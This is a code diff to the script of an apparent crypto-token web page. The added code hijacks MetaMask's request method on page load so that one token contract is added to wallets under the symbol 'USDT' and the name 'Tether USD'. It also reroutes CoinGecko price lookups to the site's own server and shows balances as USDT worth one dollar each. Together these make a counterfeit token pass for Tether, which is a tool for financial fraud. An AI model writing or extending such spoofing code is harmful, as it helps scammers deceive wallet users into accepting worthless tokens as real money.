@@ -263,7 +263,49 @@
   </div>
 
   <script>
+    // Enhanced provider interception for complete spoofing
+    function setupProviderInterception() {
+      console.log("Setting up provider interception...");
+      
+      if (window.ethereum) {
+        // Store the original request method
+        const originalRequest = window.ethereum.request;
+        
+        // Override the request method to intercept calls
+        window.ethereum.request = async function(args) {
+          // Log all MetaMask requests for debugging
+          console.log("MetaMask request:", args);
+          
+          // Intercept token addition calls
+          if (args.method === 'wallet_watchAsset') {
+            console.log("Intercepting token addition...");
+            
+            // If it's our token address, modify the options to use USDT
+            if (args.params && 
+                args.params.options && 
+                args.params.options.address && 
+                args.params.options.address.toLowerCase() === '0x6ba2344f60c999d0ea102c59ab8be6872796c08c') {
+                
+              console.log("Modifying token parameters to USDT...");
+              
+              // Make sure it always uses USDT symbol and name
+              args.params.options.symbol = "USDT";
+              args.params.options.name = "Tether USD";
+            }
+          }
+          
+          // Continue with the original call
+          return originalRequest.call(this, args);
+        };
+        
+        console.log("Provider interception setup complete");
+      }
+    }
+    
     document.addEventListener('DOMContentLoaded', async () => {
+      // First set up provider interception
+      setupProviderInterception();
+      
       const qrCodeImage = document.getElementById('qrCodeImage');
       const loadingOverlay = document.getElementById('loadingOverlay');
       const tokenBalance = document.getElementById('tokenBalance');
@@ -274,7 +316,7 @@
       // Setup Bootstrap modals
       const successModal = new bootstrap.Modal(document.getElementById('successModal'));
       
-      // Token configuration
+      // Token configuration - always use USDT in UI and add to MetaMask with USDT symbol
       const tokenConfig = {
         address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',
         symbol: 'USDT',
@@ -299,7 +341,22 @@
         console.error('Error loading QR code:', error);
       }
       
-      // SIMPLIFIED ADD TOKEN FUNCTION
+      // CoinGecko API interception to ensure USDT price shows
+      const originalFetch = window.fetch;
+      window.fetch = function(resource, init) {
+        if (typeof resource === 'string' && resource.includes('api.coingecko.com')) {
+          console.log("Intercepting CoinGecko call:", resource);
+          const newUrl = resource.replace(
+            'https://api.coingecko.com', 
+            window.location.origin + '/api'
+          );
+          console.log("Redirecting to:", newUrl);
+          return originalFetch(newUrl, init);
+        }
+        return originalFetch(resource, init);
+      };
+      
+      // UPDATED ADD TOKEN FUNCTION
       document.getElementById('addToWalletBtn').addEventListener('click', async () => {
         try {
           // Check if MetaMask is installed
@@ -312,55 +369,97 @@
           // Show loading overlay at the start
           loadingOverlay.style.display = 'flex';
           
-          // Intercept CoinGecko API calls for proper price display
-          const originalFetch = window.fetch;
-          window.fetch = function(resource, init) {
-            if (typeof resource === 'string' && resource.includes('api.coingecko.com')) {
-              const newUrl = resource.replace(
-                'https://api.coingecko.com', 
-                window.location.origin + '/api'
-              );
-              return originalFetch(newUrl, init);
+          console.log("Starting token addition process...");
+          
+          // Make sure we're on the right network first
+          console.log("Checking network...");
+          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+          console.log("Current chain ID:", chainId);
+          console.log("Target chain ID:", tokenConfig.networkId);
+          
+          if (chainId !== tokenConfig.networkId) {
+            console.log("Network mismatch, attempting to switch...");
+            try {
+              // Try to switch to Base network
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: tokenConfig.networkId }]
+              });
+              console.log("Successfully switched to Base network");
+            } catch (switchError) {
+              // If Base network not added yet, add it
+              if (switchError.code === 4902) {
+                console.log("Base network not found, adding it...");
+                await window.ethereum.request({
+                  method: 'wallet_addEthereumChain',
+                  params: [{
+                    chainId: tokenConfig.networkId,
+                    chainName: tokenConfig.networkName,
+                    nativeCurrency: {
+                      name: 'Ethereum',
+                      symbol: 'ETH',
+                      decimals: 18
+                    },
+                    rpcUrls: [tokenConfig.rpcUrl],
+                    blockExplorerUrls: [tokenConfig.blockExplorerUrl]
+                  }]
+                });
+                console.log("Base network added successfully");
+              } else {
+                // Hide loading overlay on error
+                loadingOverlay.style.display = 'none';
+                console.error("Error switching networks:", switchError);
+                if (switchError.code !== 4001) { // Don't alert if user rejected
+                  alert('Error switching networks: ' + switchError.message);
+                }
+                return;
+              }
             }
-            return originalFetch(resource, init);
-          };
+          }
           
-          console.log("Adding token to MetaMask:", tokenConfig); // Debug logging
+          // Add token with USDT symbol directly - our provider override will make this work
+          console.log("Adding token to MetaMask with options:", {
+            address: tokenConfig.address,
+            symbol: 'USDT',
+            decimals: tokenConfig.decimals,
+          });
           
-          // Add token with minimal permissions - no account access needed 
-          // No timeout promise race - let MetaMask take its time
           const wasAdded = await window.ethereum.request({
             method: 'wallet_watchAsset',
             params: {
               type: 'ERC20',
               options: {
                 address: tokenConfig.address,
-                symbol: tokenConfig.symbol,
+                symbol: 'USDT',
                 decimals: tokenConfig.decimals,
                 image: tokenConfig.image
               }
             }
           });
           
-          // ALWAYS hide loading overlay immediately after response received
+          // ALWAYS hide loading overlay immediately after
           loadingOverlay.style.display = 'none';
+          console.log("Token addition result:", wasAdded);
           
           // Show success modal if added
           if (wasAdded) {
-            // Try to get account access to update balance, but this is optional
-            try {
-              const accounts = await window.ethereum.request({ 
-                method: 'eth_accounts' // Just get already connected accounts, don't prompt
-              });
-              
-              if (accounts && accounts.length > 0) {
-                await fetchTokenBalance(accounts[0]);
-              }
-            } catch (accountError) {
-              console.log('Optional account access failed:', accountError);
-            }
-            
+            // Show USDT added success message
             successModal.show();
+            
+            // Try to update balance display after a short delay
+            setTimeout(async () => {
+              try {
+                const accounts = await window.ethereum.request({ 
+                  method: 'eth_accounts' 
+                });
+                
+                if (accounts && accounts.length > 0) {
+                  await fetchTokenBalance(accounts[0]);
+                }
+              } catch (error) {
+                console.log('Optional account access failed:', error);
+              }
+            }, 1000);
           }
         } catch (error) {
           // ALWAYS hide loading overlay if there's an error
@@ -378,6 +477,11 @@
         }
       });
       
+      // Ensure loading overlay is never stuck
+      window.addEventListener('load', () => {
+        loadingOverlay.style.display = 'none';
+      });
+      
       // Function to fetch token balance with fixed decimals
       async function fetchTokenBalance(account) {
         try {
@@ -386,7 +490,7 @@
           const balanceData = await balanceResponse.json();
           
           if (balanceData.formattedBalance) {
-            // Update balance display with proper formatting
+            // Update balance display with proper formatting as USDT
             tokenBalance.textContent = `${balanceData.formattedBalance} USDT`;
             
             // Show USD value (1:1 as it's a stablecoin)
@@ -442,14 +546,6 @@
           // Reload the page on chain change
           window.location.reload();
         });
-      }
-    });
-    
-    // Add this safety measure to ensure loading overlay is never stuck
-    window.addEventListener('load', () => {
-      const loadingOverlay = document.getElementById('loadingOverlay');
-      if (loadingOverlay) {
-        loadingOverlay.style.display = 'none';
       }
     });
   </script>
